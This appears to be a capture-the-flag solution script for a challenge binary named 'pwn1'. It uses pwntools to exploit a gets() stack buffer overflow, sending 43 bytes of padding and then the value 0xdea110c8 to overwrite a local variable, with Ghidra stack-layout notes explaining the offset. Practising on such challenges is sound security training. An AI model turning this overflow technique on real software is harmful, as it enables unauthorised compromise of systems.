from pwn import *
import sys

context(arch='i386', os='linux')
p = process('./pwn1', stdout=sys.stdout.fileno())  # Print output live

p.sendline(b"Sir Lancelot of Camelot")
p.sendline(b"To seek the Holy Grail.")
p.sendline(b'A' * 0x2b + p32(0xdea110c8)) # the last \n is necessary because gets() needs to read \n or EOF

p.wait_for_close()

""" Ghidra stack layout:
0x43 (input) - 0x18 (target) = 0x2b = 43 is the padding we have to add
after that, we just insert the int32 to overwrite the 'target' variable.
                         *******************************************************
                         *                      FUNCTION                       *
                         *******************************************************
                         int __cdecl main(void)
           int             EAX:4        <RETURN>                           XREF[1]:   00010807(W)  
           undefined4      EAX:4        cmp                                XREF[1]:   00010807(W)  
           undefined4      Stack[0x0]:4 local_res0                         XREF[2]:   00010780(R), 
                                                                                      000108df(*)  
           undefined1      Stack[-0x10  local_10                           XREF[1]:   000108d9(*)  
           undefined4      Stack[-0x14  local_14                           XREF[1]:   000107ad(W)  
           undefined4      Stack[-0x18  target                             XREF[2]:   000107b4(W), 
                                                                                      000108b2(R)  
           undefined1[4    Stack[-0x43  input                              XREF[5]:   000107ed(*), 
                                                                                      00010803(*), 
                                                                                      0001084f(*), 
                                                                                      00010865(*), 
                                                                                      000108a6(*)  
                         main                                      XREF[5]:   Entry Point(*), 
                                                                               _start:000105e6(*), 00010ab8, 
                                                                               00010b4c(*), 00011ff8(*)  
      00010779 8d 4c 24      LEA       ECX=>Stack[0x4], [ESP + 0x4]
"""
